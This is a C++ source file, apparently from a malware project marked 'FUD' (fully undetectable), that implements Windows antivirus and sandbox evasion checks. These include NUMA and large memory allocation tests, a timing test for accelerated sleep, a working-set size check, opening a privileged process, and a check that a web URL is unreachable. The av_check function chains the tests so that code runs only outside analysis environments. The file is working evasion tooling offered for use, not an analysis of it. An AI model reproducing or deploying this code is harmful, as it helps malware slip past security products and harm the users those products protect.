#include "fud.h"
#include "common.h"
#include <windows.h>
#include <Wininet.h>
#pragma comment(lib, "Wininet.lib")

#include <Psapi.h>

#include <time.h>
#pragma comment(lib, "winmm.lib")

#ifdef FUD
bool numa_check()
{
	LPVOID numa = nullptr;

	numa = VirtualAllocExNuma(GetCurrentProcess(), nullptr, NUMA_CHECK_PAGE_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);

	bool rtn = numa != nullptr;

#ifdef _DEBUG
	printf("[fud] numa_check %d\r\n", rtn);
#endif // _DEBUG

	return rtn;
}

bool web_page_check()
{
	char buffer[1024];
	HINTERNET http, httpurl;

	http = InternetOpen(nullptr, INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
	httpurl = InternetOpenUrl(http, WEB_PAGE_CHECK_URL, nullptr, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);

	bool rtn = !httpurl;

	InternetCloseHandle(http);
	InternetCloseHandle(httpurl);


#ifdef _DEBUG
	printf("[fud] web_page_check %d\r\n", rtn);
#endif // _DEBUG

	return rtn;
}

bool loop_check()
{
	int cap = 0;
	for (int i = 0; i < LOOP_CHECK_COUNT; i++)
		cap++;

	bool rtn = cap == LOOP_CHECK_COUNT;


#ifdef _DEBUG
	printf("[fud] loop_check %d\r\n", rtn);
#endif // _DEBUG

	return rtn;
}

bool memalloc_check()
{
	char* memdmp = nullptr;
	memdmp = (char*)malloc(MEMORY_CHECK_SIZE);
	bool malloc_check = memdmp != nullptr;

	memset(memdmp, 0x00, MEMORY_CHECK_SIZE);
	free(memdmp);


	memdmp = nullptr;
	memdmp = new char[MEMORY_CHECK_SIZE];
	bool new_check = memdmp != nullptr;

	memset(memdmp, 0x00, MEMORY_CHECK_SIZE);
	free(memdmp);

	bool rtn = new_check && malloc_check;

#ifdef _DEBUG
	printf("[fud] memalloc_check %d\r\n", rtn);
#endif // _DEBUG

	return rtn;
}

bool fls_check()
{
	bool rtn = FlsAlloc(NULL) != FLS_OUT_OF_INDEXES;

#ifdef _DEBUG
	printf("[fud] fls_check %d\r\n", rtn);
#endif // _DEBUG

	return rtn;
}

bool process_memory_check()
{
	PROCESS_MEMORY_COUNTERS pmc;
	GetProcessMemoryInfo(GetCurrentProcess(), &pmc, sizeof(pmc));

	bool rtn = pmc.WorkingSetSize >= PROCESS_MEMORY_CHECK_SIZE;

#ifdef _DEBUG
	printf("[fud] process_memory_check %d\r\n", rtn);
#endif // _DEBUG

	return rtn;
}

bool time_check()
{
	DWORD timeStart;
	DWORD timeEnd;

	timeStart = timeGetTime();
	Sleep(TIME_CHECK_SLEEP_TIME);
	timeEnd = timeGetTime();

	bool rtn = (timeEnd >= (timeStart + TIME_CHECK_THRESHOLD_1)) && (timeEnd <= (timeStart + TIME_CHECK_THRESHOLD_2));

#ifdef _DEBUG
	printf("[fud] time_check %d => %d %d bypassed\r\n", rtn, timeStart, timeEnd);
	rtn = true;
#endif // _DEBUG

	return rtn;
}

bool process_check()
{
	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCESS_ACCESS_CHECK_PID);

	bool rtn = process == NULL;

#ifdef _DEBUG
	printf("[fud] process_check %d\r\n", rtn);
#endif // _DEBUG

	return rtn;
}

bool av_check()
{
	return process_check() &&
		time_check() && 
		process_memory_check() && 
		fls_check() && 
		memalloc_check() && 
		loop_check() && 
		web_page_check() && 
		numa_check();
}
#endif // FUD
